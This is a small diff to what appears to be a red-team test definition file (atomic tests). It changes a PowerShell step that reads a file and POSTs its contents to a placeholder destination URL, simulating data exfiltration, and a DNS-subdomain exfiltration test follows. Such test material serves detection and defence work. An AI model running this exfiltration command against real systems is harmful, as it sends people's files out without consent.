@@ -23,7 +23,7 @@ atomic_tests:
       }
       [System.Net.ServicePointManager]::Expect100Continue = $false
       $filecontent = Get-Content -Path #{filepath}
-      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
+      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive -UseBasicParsing
     name: powershell
 
 - name: Text Based Data Exfiltration using DNS subdomains
